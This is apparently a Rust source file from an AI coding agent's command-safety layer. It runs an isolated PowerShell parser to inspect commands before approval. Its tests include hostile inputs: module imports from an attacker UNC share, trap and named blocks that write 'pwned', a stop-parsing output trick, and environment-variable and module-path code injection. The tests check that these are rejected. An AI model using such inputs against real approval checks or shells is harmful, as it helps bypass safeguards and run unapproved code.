use base64::Engine;
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
#[cfg(windows)]
use codex_utils_absolute_path::AbsolutePathBuf;
use std::collections::HashMap;
#[cfg(windows)]
use std::ffi::OsString;
use std::io::BufRead;
use std::io::BufReader;
use std::io::ErrorKind;
use std::io::Write;
use std::path::Path;
use std::path::PathBuf;
use std::process::Child;
use std::process::ChildStdin;
use std::process::ChildStdout;
use std::process::Command;
use std::process::Stdio;
use std::sync::LazyLock;
use std::sync::Mutex;
use std::sync::PoisonError;

use super::powershell_preparse::requires_preparse_rejection;

const POWERSHELL_PARSER_SCRIPT: &str = include_str!("powershell_parser.ps1");
const MAX_POWERSHELL_RESPONSE_LINE_BYTES: usize = 8 * 1024 * 1024;
#[cfg(any(test, windows))]
const WINDOWS_POWERSHELL_SUFFIX: &str = r"WindowsPowerShell\v1.0\powershell.exe";
#[cfg(any(test, windows))]
const WINDOWS_PWSH_SUFFIX: &str = r"PowerShell\7\pwsh.exe";

/// Cache one long-lived parser process per executable path so repeated safety checks reuse
/// PowerShell startup work while still consulting the real parser every time.
///
/// We keep the cache behind one mutex because each child process speaks a simple
/// request/response protocol over a single stdin/stdout pair, so callers targeting the same
/// executable must serialize access anyway.
fn parse_with_powershell_ast(executable: &Path, script: &str) -> PowershellParseOutcome {
    static PARSER_PROCESSES: LazyLock<Mutex<HashMap<PathBuf, PowershellParserProcess>>> =
        LazyLock::new(|| Mutex::new(HashMap::new()));

    let mut parser_processes = PARSER_PROCESSES
        .lock()
        .unwrap_or_else(PoisonError::into_inner);
    parse_with_cached_process(&mut parser_processes, executable, script)
}

pub(crate) fn try_parse_powershell_ast_commands(
    executable: &str,
    script: &str,
) -> Option<Vec<Vec<String>>> {
    let parser_executable = trusted_powershell_parser_executable(executable)?;
    match parse_with_powershell_ast(&parser_executable, script) {
        PowershellParseOutcome::Commands(commands) => Some(commands),
        PowershellParseOutcome::Unsupported | PowershellParseOutcome::Failed => None,
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub(crate) enum TrustedPowerShellFlavor {
    WindowsPowerShell,
    PowerShell7,
}

/// Parses a script with the authoritative machine-wide parser for the requested flavor.
///
/// Unlike [`try_parse_powershell_ast_commands`], parser selection here is independent of a
/// runtime command's executable spelling. This lets callers inspect an untrusted runtime wrapper
/// without ever spawning that wrapper before approval.
pub(crate) fn parse_powershell_ast_commands_with_trusted_flavor(
    flavor: TrustedPowerShellFlavor,
    script: &str,
) -> PowershellParseOutcome {
    #[cfg(windows)]
    {
        let parser_executable = match flavor {
            TrustedPowerShellFlavor::WindowsPowerShell => trusted_powershell_invocation_path(
                TrustedPowerShellRoot::System,
                WINDOWS_POWERSHELL_SUFFIX,
            ),
            TrustedPowerShellFlavor::PowerShell7 => trusted_powershell_invocation_path(
                TrustedPowerShellRoot::ProgramFiles,
                WINDOWS_PWSH_SUFFIX,
            ),
        };
        let Some(parser_executable) = parser_executable else {
            return PowershellParseOutcome::Failed;
        };
        parse_with_powershell_ast(&parser_executable, script)
    }

    #[cfg(not(windows))]
    {
        let _ = (flavor, script);
        PowershellParseOutcome::Failed
    }
}

/// Selects the host-side parser only when the command itself names that same trusted binary.
///
/// The parser runs before the command approval and sandbox boundaries. Bare executable names and
/// arbitrary paths are therefore not eligible: their eventual resolution can depend on the
/// workspace, current directory, or `PATH`. Returning a canonical executable derived from an
/// authoritative Windows known folder also ensures the parser spawn never receives the command's
/// attacker-controlled `argv[0]`.
fn trusted_powershell_parser_executable(executable: &str) -> Option<PathBuf> {
    #[cfg(windows)]
    {
        resolve_trusted_powershell_parser_executable_with(
            executable,
            trusted_windows_root,
            canonicalize_trusted_windows_path,
            Path::is_file,
        )
    }

    #[cfg(not(windows))]
    {
        let _ = executable;
        None
    }
}

pub(crate) fn is_trusted_powershell_parser_executable(executable: &str) -> bool {
    trusted_powershell_parser_executable(executable).is_some()
}

/// Returns the authoritative Windows PowerShell invocation path only when the production trust
/// resolver accepts that exact known-folder-derived path.
#[cfg(all(test, windows))]
pub(crate) fn trusted_windows_powershell_invocation_path() -> Option<PathBuf> {
    trusted_powershell_invocation_path(TrustedPowerShellRoot::System, WINDOWS_POWERSHELL_SUFFIX)
}

/// Returns the standard machine-wide PowerShell 7 invocation path when it is installed and the
/// production trust resolver accepts it.
#[cfg(all(test, windows))]
pub(crate) fn trusted_standard_pwsh_invocation_path() -> Option<PathBuf> {
    trusted_powershell_invocation_path(TrustedPowerShellRoot::ProgramFiles, WINDOWS_PWSH_SUFFIX)
}

#[cfg(windows)]
fn trusted_powershell_invocation_path(
    root_kind: TrustedPowerShellRoot,
    suffix: &str,
) -> Option<PathBuf> {
    let root = trusted_windows_root(root_kind).ok()?;
    let invocation_path = join_windows_path(&root, suffix);
    let invocation_path_str = invocation_path.to_str()?;
    trusted_powershell_parser_executable(invocation_path_str)
}

#[cfg(any(test, windows))]
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum TrustedPowerShellRoot {
    System,
    ProgramFiles,
}

#[cfg(any(test, windows))]
fn resolve_trusted_powershell_parser_executable_with(
    executable: &str,
    resolve_root: impl Fn(TrustedPowerShellRoot) -> std::io::Result<PathBuf>,
    canonicalize: impl Fn(&Path) -> std::io::Result<PathBuf>,
    is_file: impl Fn(&Path) -> bool,
) -> Option<PathBuf> {
    let normalized_executable = normalized_windows_path(executable);

    [
        (TrustedPowerShellRoot::System, WINDOWS_POWERSHELL_SUFFIX),
        (TrustedPowerShellRoot::ProgramFiles, WINDOWS_PWSH_SUFFIX),
    ]
    .into_iter()
    .find_map(|(root_kind, suffix)| {
        let root = resolve_root(root_kind).ok()?;
        let candidate = join_windows_path(&root, suffix);
        let candidate_str = candidate.to_str()?;
        if !normalized_executable.eq_ignore_ascii_case(&normalized_windows_path(candidate_str)) {
            return None;
        }

        let canonical_root = canonicalize(&root).ok()?;
        let canonical_candidate = canonicalize(&candidate).ok()?;
        let expected_candidate = join_windows_path(&canonical_root, suffix);
        if !normalized_windows_path(canonical_candidate.to_str()?)
            .eq_ignore_ascii_case(&normalized_windows_path(expected_candidate.to_str()?))
            || !is_file(&canonical_candidate)
        {
            return None;
        }

        Some(canonical_candidate)
    })
}

#[cfg(windows)]
fn join_windows_path(root: &Path, suffix: &str) -> PathBuf {
    root.join(suffix)
}

#[cfg(all(test, not(windows)))]
fn join_windows_path(root: &Path, suffix: &str) -> PathBuf {
    let mut path = root
        .to_string_lossy()
        .trim_end_matches(['/', '\\'])
        .to_string();
    path.push('\\');
    path.push_str(suffix);
    PathBuf::from(path)
}

#[cfg(any(test, windows))]
fn normalized_windows_path(path: &str) -> String {
    path.strip_prefix(r"\\?\")
        .unwrap_or(path)
        .replace('/', "\\")
}

#[cfg(windows)]
fn canonicalize_trusted_windows_path(path: &Path) -> std::io::Result<PathBuf> {
    AbsolutePathBuf::from_absolute_path_checked(path)?
        .canonicalize()
        .map(AbsolutePathBuf::into_path_buf)
}

#[cfg(windows)]
fn trusted_windows_root(root: TrustedPowerShellRoot) -> std::io::Result<PathBuf> {
    use std::os::windows::ffi::OsStringExt;
    use windows_sys::Win32::System::Com::CoTaskMemFree;
    use windows_sys::Win32::UI::Shell::FOLDERID_ProgramFiles;
    use windows_sys::Win32::UI::Shell::FOLDERID_System;
    use windows_sys::Win32::UI::Shell::KF_FLAG_DEFAULT;
    use windows_sys::Win32::UI::Shell::SHGetKnownFolderPath;

    let folder_id = match root {
        TrustedPowerShellRoot::System => &FOLDERID_System,
        TrustedPowerShellRoot::ProgramFiles => &FOLDERID_ProgramFiles,
    };
    let mut path_ptr = std::ptr::null_mut::<u16>();
    let flags = u32::try_from(KF_FLAG_DEFAULT)
        .map_err(|_| std::io::Error::other("KF_FLAG_DEFAULT did not fit in u32"))?;
    // SAFETY: SHGetKnownFolderPath initializes path_ptr with a CoTaskMem-allocated,
    // null-terminated UTF-16 string on success.
    let hr = unsafe { SHGetKnownFolderPath(folder_id, flags, 0, &mut path_ptr) };
    if hr != 0 {
        if !path_ptr.is_null() {
            // SAFETY: Any non-null path returned by SHGetKnownFolderPath uses CoTaskMem.
            unsafe { CoTaskMemFree(path_ptr.cast()) };
        }
        return Err(std::io::Error::other(format!(
            "SHGetKnownFolderPath failed with HRESULT {hr:#010x}"
        )));
    }
    if path_ptr.is_null() {
        return Err(std::io::Error::other(
            "SHGetKnownFolderPath returned a null pointer",
        ));
    }

    // SAFETY: path_ptr is a valid null-terminated UTF-16 string allocated by
    // SHGetKnownFolderPath and is freed after copying.
    let path = unsafe {
        let mut len = 0usize;
        while *path_ptr.add(len) != 0 {
            len += 1;
        }
        let wide = std::slice::from_raw_parts(path_ptr, len);
        let path = PathBuf::from(OsString::from_wide(wide));
        CoTaskMemFree(path_ptr.cast());
        path
    };

    Ok(path)
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum PowershellParseOutcome {
    Commands(Vec<Vec<String>>),
    Unsupported,
    Failed,
}

fn parse_with_cached_process(
    parser_processes: &mut HashMap<PathBuf, PowershellParserProcess>,
    executable: &Path,
    script: &str,
) -> PowershellParseOutcome {
    // `powershell.exe` and `pwsh.exe` do not accept the same language surface, so each
    // executable keeps its own parser process and request stream.
    let parser_key = executable.to_path_buf();
    for attempt in 0..=1 {
        if !parser_processes.contains_key(&parser_key) {
            match PowershellParserProcess::spawn(executable) {
                Ok(process) => {
                    parser_processes.insert(parser_key.clone(), process);
                }
                Err(_) => return PowershellParseOutcome::Failed,
            }
        }

        let Some(parser_process) = parser_processes.get_mut(&parser_key) else {
            return PowershellParseOutcome::Failed;
        };
        let parse_result = parser_process.parse(script);
        match parse_result {
            Ok(outcome) => return outcome,
            Err(_) if attempt == 0 => {
                // The common failure mode here is that a previously cached child exited or its
                // stdio stream became unusable between requests. Drop that process and retry once
                // with a fresh child before giving up.
                parser_processes.remove(&parser_key);
            }
            Err(_) => return PowershellParseOutcome::Failed,
        }
    }

    PowershellParseOutcome::Failed
}

fn encode_powershell_base64(script: &str) -> String {
    let mut utf16 = Vec::with_capacity(script.len() * 2);
    for unit in script.encode_utf16() {
        utf16.extend_from_slice(&unit.to_le_bytes());
    }
    BASE64_STANDARD.encode(utf16)
}

fn encoded_parser_script() -> &'static str {
    static ENCODED: LazyLock<String> =
        LazyLock::new(|| encode_powershell_base64(POWERSHELL_PARSER_SCRIPT));
    &ENCODED
}

struct PowershellParserProcess {
    child: Child,
    stdin: ChildStdin,
    stdout: BufReader<ChildStdout>,
    // Request ids are monotonic within one child process so the caller can detect protocol
    // desynchronization if stdout is contaminated or the child is unexpectedly replaced.
    next_request_id: u64,
}

impl PowershellParserProcess {
    fn spawn(executable: &Path) -> std::io::Result<Self> {
        let mut command = Command::new(executable);
        Self::spawn_command(executable, &mut command)
    }

    fn spawn_command(_executable: &Path, command: &mut Command) -> std::io::Result<Self> {
        #[cfg(windows)]
        configure_trusted_parser_environment(_executable, command)?;
        let mut child = command
            .args([
                "-NoLogo",
                "-NoProfile",
                "-NonInteractive",
                "-EncodedCommand",
                encoded_parser_script(),
            ])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()?;
        let stdin = match take_child_stdin(&mut child) {
            Ok(stdin) => stdin,
            Err(error) => {
                kill_child(&mut child);
                return Err(error);
            }
        };
        let stdout = match take_child_stdout(&mut child) {
            Ok(stdout) => stdout,
            Err(error) => {
                kill_child(&mut child);
                return Err(error);
            }
        };
        Ok(Self {
            child,
            stdin,
            stdout,
            next_request_id: 0,
        })
    }

    fn parse(&mut self, script: &str) -> std::io::Result<PowershellParseOutcome> {
        // PowerShell performs semantic work after parsing, including module and DSC discovery.
        // Reject those language forms before sending attacker-controlled source to ParseInput.
        if requires_preparse_rejection(script) {
            return Ok(PowershellParseOutcome::Unsupported);
        }

        let request = PowershellParserRequest {
            id: self.next_request_id,
            payload: encode_powershell_base64(script),
        };
        self.next_request_id = self.next_request_id.wrapping_add(1);
        let mut request_line = serialize_request(&request)?;
        request_line.push('\n');
        self.stdin.write_all(request_line.as_bytes())?;
        self.stdin.flush()?;

        let response_line =
            read_bounded_response_line(&mut self.stdout, MAX_POWERSHELL_RESPONSE_LINE_BYTES)?;

        let response = deserialize_response(&response_line)?;
        // Requests are serialized today; the id still catches protocol desyncs if stdout is
        // contaminated or the child process is unexpectedly replaced mid-request. That turns an
        // ambiguous parser result into a hard failure so the caller can discard the cached child.
        if response.id != request.id {
            return Err(std::io::Error::new(
                ErrorKind::InvalidData,
                format!(
                    "PowerShell parser returned response id {} for request {}",
                    response.id, request.id
                ),
            ));
        }

        Ok(response.into_outcome())
    }
}

#[cfg(windows)]
fn configure_trusted_parser_environment(
    executable: &Path,
    command: &mut Command,
) -> std::io::Result<()> {
    let parser_home = executable.parent().ok_or_else(|| {
        std::io::Error::new(
            ErrorKind::InvalidInput,
            "trusted PowerShell parser has no parent directory",
        )
    })?;
    let parser_home = canonicalize_trusted_windows_path(parser_home)?;
    let system_dir = trusted_windows_root(TrustedPowerShellRoot::System)?;
    let system_dir = canonicalize_trusted_windows_path(&system_dir)?;
    let windows_dir = system_dir.parent().ok_or_else(|| {
        std::io::Error::new(
            ErrorKind::InvalidInput,
            "Windows System known folder has no parent directory",
        )
    })?;

    command
        .env_clear()
        .env("SystemRoot", windows_dir)
        .env("WINDIR", windows_dir)
        .env("PSModulePath", "")
        .env("POWERSHELL_TELEMETRY_OPTOUT", "1")
        .env("POWERSHELL_UPDATECHECK", "Off")
        .current_dir(parser_home);
    Ok(())
}

fn read_bounded_response_line(
    reader: &mut impl BufRead,
    max_bytes: usize,
) -> std::io::Result<String> {
    let mut line = String::new();
    let limit = u64::try_from(max_bytes)
        .map_err(|_| invalid_response("response limit does not fit in u64"))?
        .saturating_add(1);
    let mut limited = std::io::Read::take(reader, limit);
    let bytes_read = limited.read_line(&mut line)?;
    if bytes_read == 0 {
        return Err(std::io::Error::new(
            ErrorKind::UnexpectedEof,
            "PowerShell parser closed stdout",
        ));
    }
    if bytes_read > max_bytes {
        return Err(invalid_response(
            "PowerShell parser response exceeded the limit",
        ));
    }
    if !line.ends_with('\n') {
        return Err(std::io::Error::new(
            ErrorKind::UnexpectedEof,
            "PowerShell parser response was not newline-terminated",
        ));
    }
    Ok(line)
}

impl Drop for PowershellParserProcess {
    fn drop(&mut self) {
        kill_child(&mut self.child);
    }
}

fn take_child_stdin(child: &mut Child) -> std::io::Result<ChildStdin> {
    child.stdin.take().ok_or_else(|| {
        std::io::Error::new(
            ErrorKind::BrokenPipe,
            "PowerShell parser child did not expose stdin",
        )
    })
}

fn take_child_stdout(child: &mut Child) -> std::io::Result<BufReader<ChildStdout>> {
    child.stdout.take().map(BufReader::new).ok_or_else(|| {
        std::io::Error::new(
            ErrorKind::BrokenPipe,
            "PowerShell parser child did not expose stdout",
        )
    })
}

fn serialize_request(request: &PowershellParserRequest) -> std::io::Result<String> {
    if request.payload.contains(['\t', '\r', '\n']) {
        return Err(std::io::Error::new(
            ErrorKind::InvalidData,
            "PowerShell parser request payload contains a framing delimiter",
        ));
    }
    Ok(format!("{}\t{}", request.id, request.payload))
}

fn deserialize_response(response_line: &str) -> std::io::Result<PowershellParserResponse> {
    let response_line = response_line.trim_end_matches(['\r', '\n']);
    let mut fields = response_line.splitn(3, '\t');
    let id = fields
        .next()
        .ok_or_else(|| invalid_response("missing request id"))?
        .parse::<u64>()
        .map_err(|_| invalid_response("invalid request id"))?;
    let status = fields
        .next()
        .ok_or_else(|| invalid_response("missing status"))?
        .to_string();
    let payload = fields
        .next()
        .ok_or_else(|| invalid_response("missing payload"))?;
    let commands = if status == "ok" {
        Some(decode_commands_payload(payload)?)
    } else {
        if !payload.is_empty() {
            return Err(invalid_response("non-ok response contains a payload"));
        }
        None
    };

    Ok(PowershellParserResponse {
        id,
        status,
        commands,
    })
}

struct PowershellParserRequest {
    id: u64,
    payload: String,
}

#[derive(Debug, PartialEq, Eq)]
struct PowershellParserResponse {
    id: u64,
    status: String,
    commands: Option<Vec<Vec<String>>>,
}

fn decode_commands_payload(payload: &str) -> std::io::Result<Vec<Vec<String>>> {
    let bytes = BASE64_STANDARD
        .decode(payload)
        .map_err(|_| invalid_response("commands payload is not valid base64"))?;
    let mut offset = 0usize;
    let command_count = read_payload_u32(&bytes, &mut offset)?;
    let command_count = usize::try_from(command_count)
        .map_err(|_| invalid_response("command count does not fit in usize"))?;
    let mut commands = Vec::with_capacity(command_count.min(bytes.len()));

    for _ in 0..command_count {
        let word_count = read_payload_u32(&bytes, &mut offset)?;
        let word_count = usize::try_from(word_count)
            .map_err(|_| invalid_response("word count does not fit in usize"))?;
        let mut command = Vec::with_capacity(word_count.min(bytes.len()));
        for _ in 0..word_count {
            let word_len = read_payload_u32(&bytes, &mut offset)?;
            let word_len = usize::try_from(word_len)
                .map_err(|_| invalid_response("word length does not fit in usize"))?;
            let word_end = offset
                .checked_add(word_len)
                .filter(|end| *end <= bytes.len())
                .ok_or_else(|| invalid_response("word extends beyond commands payload"))?;
            let word = std::str::from_utf8(&bytes[offset..word_end])
                .map_err(|_| invalid_response("command word is not valid UTF-8"))?;
            command.push(word.to_string());
            offset = word_end;
        }
        commands.push(command);
    }

    if offset != bytes.len() {
        return Err(invalid_response("commands payload has trailing data"));
    }
    Ok(commands)
}

fn read_payload_u32(bytes: &[u8], offset: &mut usize) -> std::io::Result<u32> {
    let end = offset
        .checked_add(4)
        .filter(|end| *end <= bytes.len())
        .ok_or_else(|| invalid_response("commands payload ended before a length field"))?;
    let value = u32::from_le_bytes(
        bytes[*offset..end]
            .try_into()
            .map_err(|_| invalid_response("invalid length field"))?,
    );
    *offset = end;
    Ok(value)
}

fn invalid_response(message: &str) -> std::io::Error {
    std::io::Error::new(ErrorKind::InvalidData, message)
}

impl PowershellParserResponse {
    fn into_outcome(self) -> PowershellParseOutcome {
        match self.status.as_str() {
            "ok" => self
                .commands
                .filter(|commands| {
                    !commands.is_empty()
                        && commands
                            .iter()
                            .all(|cmd| !cmd.is_empty() && cmd.iter().all(|word| !word.is_empty()))
                })
                .map(PowershellParseOutcome::Commands)
                .unwrap_or(PowershellParseOutcome::Unsupported),
            "unsupported" => PowershellParseOutcome::Unsupported,
            _ => PowershellParseOutcome::Failed,
        }
    }
}

#[cfg(test)]
#[path = "powershell_parser_response_tests.rs"]
mod response_tests;

fn kill_child(child: &mut Child) {
    let _ = child.kill();
    let _ = child.wait();
}

#[cfg(test)]
#[path = "powershell_parser_trust_tests.rs"]
mod trust_tests;

#[cfg(all(test, windows))]
mod tests {
    use super::*;
    use pretty_assertions::assert_eq;

    fn words(items: &[&str]) -> Vec<String> {
        items.iter().map(ToString::to_string).collect()
    }

    #[test]
    fn production_resolver_handles_multiple_windows_powershell_requests() {
        let Some(powershell) = trusted_windows_powershell_invocation_path() else {
            panic!("Windows PowerShell must exist at the authoritative System known folder");
        };
        let Some(powershell) = powershell.to_str() else {
            panic!("the Windows System known folder must be valid UTF-8");
        };

        let first = try_parse_powershell_ast_commands(powershell, "Get-Content 'foo bar'")
            .map(PowershellParseOutcome::Commands)
            .unwrap();
        assert_eq!(
            first,
            PowershellParseOutcome::Commands(vec![vec![
                "Get-Content".to_string(),
                "foo bar".to_string(),
            ]]),
        );

        let second =
            try_parse_powershell_ast_commands(powershell, "Write-Output foo | Measure-Object")
                .map(PowershellParseOutcome::Commands)
                .unwrap();
        assert_eq!(
            second,
            PowershellParseOutcome::Commands(vec![
                vec!["Write-Output".to_string(), "foo".to_string()],
                vec!["Measure-Object".to_string()],
            ]),
        );
    }

    #[test]
    fn production_resolver_uses_standard_machine_wide_pwsh_when_installed() {
        let Some(pwsh) = trusted_standard_pwsh_invocation_path() else {
            eprintln!(
                "skipping standard pwsh trust test because Program Files\\PowerShell\\7\\pwsh.exe is not installed"
            );
            return;
        };
        let Some(pwsh) = pwsh.to_str() else {
            panic!("the Program Files known folder must be valid UTF-8");
        };

        assert_eq!(
            try_parse_powershell_ast_commands(pwsh, "pwd && ls"),
            Some(vec![vec!["pwd".to_string()], vec!["ls".to_string()]])
        );
    }

    fn trusted_windows_powershell_parser() -> PathBuf {
        let Some(invocation_path) = trusted_windows_powershell_invocation_path() else {
            panic!("Windows PowerShell must exist at the authoritative System known folder");
        };
        let Some(invocation_path_str) = invocation_path.to_str() else {
            panic!("the Windows System known folder must be valid UTF-8");
        };
        let Some(parser) = trusted_powershell_parser_executable(invocation_path_str) else {
            panic!("the production trust resolver must accept Windows PowerShell");
        };
        parser
    }

    #[test]
    fn parser_process_rejects_stop_parsing_forms() {
        let powershell = trusted_windows_powershell_parser();
        let mut parser = PowershellParserProcess::spawn(&powershell).unwrap();

        let parsed = parser
            .parse("git log --% HEAD --output=codex_poc.txt")
            .unwrap();
        assert_eq!(parsed, PowershellParseOutcome::Unsupported);
    }

    #[test]
    fn parser_process_rejects_param_blocks() {
        let powershell = trusted_windows_powershell_parser();
        let mut parser = PowershellParserProcess::spawn(&powershell).unwrap();

        let parsed = parser
            .parse("param([string]$path = (Get-Location)) Write-Output test")
            .unwrap();
        assert_eq!(parsed, PowershellParseOutcome::Unsupported);
    }

    #[test]
    fn parser_process_rejects_named_blocks() {
        let powershell = trusted_windows_powershell_parser();
        let mut parser = PowershellParserProcess::spawn(&powershell).unwrap();

        let parsed = parser
            .parse("begin { Set-Content codex_poc.txt pwned } end { Get-Content Cargo.toml }")
            .unwrap();
        assert_eq!(parsed, PowershellParseOutcome::Unsupported);
    }

    #[test]
    fn parser_process_rejects_using_statements() {
        let powershell = trusted_windows_powershell_parser();
        let mut parser = PowershellParserProcess::spawn(&powershell).unwrap();

        let parsed = parser
            .parse("using module ./codex_poc.psm1\nGet-Content Cargo.toml")
            .unwrap();
        assert_eq!(parsed, PowershellParseOutcome::Unsupported);
    }

    #[test]
    fn parser_process_rejects_preparse_and_script_requirement_forms() {
        let powershell = trusted_windows_powershell_parser();
        let mut parser = PowershellParserProcess::spawn(&powershell).unwrap();

        for script in [
            "#Requires -Modules CodexProbe\nGet-Content Cargo.toml",
            "Get-Content Cargo.toml\n#Requires -Modules C:\\workspace\\CodexProbe.psm1",
            "#Requires -Modules C:\\workspace\\CodexProbe.psd1\nGet-Content Cargo.toml",
            r#"#Requires -Modules @{ ModuleName = "CodexProbe"; ModuleVersion = "1.0" }
Get-Content Cargo.toml"#,
            "#Requires -Version 5.1\nGet-Content Cargo.toml",
            "UsInG MoDuLe '\\\\attacker\\share\\Evil.psd1'\nGet-Content Cargo.toml",
            "configuration CodexProbe { Import-DscResource -ModuleName '\\\\attacker\\share\\Evil.psd1' }",
        ] {
            assert_eq!(
                parser.parse(script).unwrap(),
                PowershellParseOutcome::Unsupported,
                "pre-parser construct must be unsupported: {script:?}",
            );
        }
    }

    #[test]
    fn parser_process_isolates_inherited_environment_and_module_search() {
        let temp = tempfile::tempdir().unwrap();
        let marker = temp.path().join("autoload-marker");
        let marker_for_powershell = marker.to_string_lossy().replace('\'', "''");
        let module_dir = temp
            .path()
            .join("Modules")
            .join("Microsoft.PowerShell.Utility");
        std::fs::create_dir_all(&module_dir).unwrap();
        std::fs::write(
            module_dir.join("Microsoft.PowerShell.Utility.psd1"),
            r#"@{
    RootModule = 'Microsoft.PowerShell.Utility.psm1'
    ModuleVersion = '1.0.0'
    GUID = '4ce19c99-2640-4f33-94e1-b7f1dc95306e'
    FunctionsToExport = @('ConvertFrom-Json', 'ConvertTo-Json')
}"#,
        )
        .unwrap();
        std::fs::write(
            module_dir.join("Microsoft.PowerShell.Utility.psm1"),
            r#"[System.IO.File]::WriteAllText('__MARKER__', 'autoloaded')
function ConvertFrom-Json { process { @{ id = 0; payload = '' } } }
function ConvertTo-Json { process { 'poisoned' } }
"#
            .replace("__MARKER__", &marker_for_powershell),
        )
        .unwrap();

        let mut executables = vec![trusted_windows_powershell_parser()];
        if let Some(pwsh) = trusted_standard_pwsh_invocation_path() {
            executables.push(pwsh);
        }

        for (index, executable) in executables.into_iter().enumerate() {
            let mut command = Command::new(&executable);
            command.env("PSModulePath", temp.path().join("Modules"));
            for name in [
                "DOTNET_STARTUP_HOOKS",
                "DOTNET_ADDITIONAL_DEPS",
                "DOTNET_SHARED_STORE",
                "DOTNET_ROOT",
                "CORECLR_PROFILER_PATH",
                "COR_PROFILER_PATH",
                "PATH",
                "HOME",
                "USERPROFILE",
                "APPDATA",
                "LOCALAPPDATA",
            ] {
                command.env(name, temp.path());
            }
            command
                .env("CORECLR_ENABLE_PROFILING", "1")
                .env("CORECLR_PROFILER", "{4CE19C99-2640-4F33-94E1-B7F1DC95306E}")
                .env("COR_ENABLE_PROFILING", "1")
                .env("COR_PROFILER", "{4CE19C99-2640-4F33-94E1-B7F1DC95306E}")
                .env("COMPlus_ReadyToRun", "0")
                .current_dir(temp.path());
            let mut parser =
                PowershellParserProcess::spawn_command(&executable, &mut command).unwrap();

            for (script, expected) in [
                (
                    "# ordinary comment\nGet-Content Cargo.toml",
                    PowershellParseOutcome::Commands(vec![words(&["Get-Content", "Cargo.toml"])]),
                ),
                (
                    "Write-Output 'fóó'; Measure-Object",
                    PowershellParseOutcome::Commands(vec![
                        words(&["Write-Output", "fóó"]),
                        words(&["Measure-Object"]),
                    ]),
                ),
                ("", PowershellParseOutcome::Unsupported),
                (
                    "Get-Content repeated.txt",
                    PowershellParseOutcome::Commands(vec![words(&["Get-Content", "repeated.txt"])]),
                ),
            ] {
                assert_eq!(
                    parser.parse(script).unwrap(),
                    expected,
                    "protected parser {executable:?} request {index} must work in isolation",
                );
            }
            assert!(
                !marker.exists(),
                "protected parser {executable:?} loaded user-controlled startup code",
            );
        }
    }

    #[test]
    fn parser_process_rejects_trap_blocks() {
        let powershell = trusted_windows_powershell_parser();
        let mut parser = PowershellParserProcess::spawn(&powershell).unwrap();

        let parsed = parser
            .parse(
                "trap { Set-Content codex_poc.txt pwned; continue } Get-Content missing -ErrorAction Stop",
            )
            .unwrap();
        assert_eq!(parsed, PowershellParseOutcome::Unsupported);
    }
}
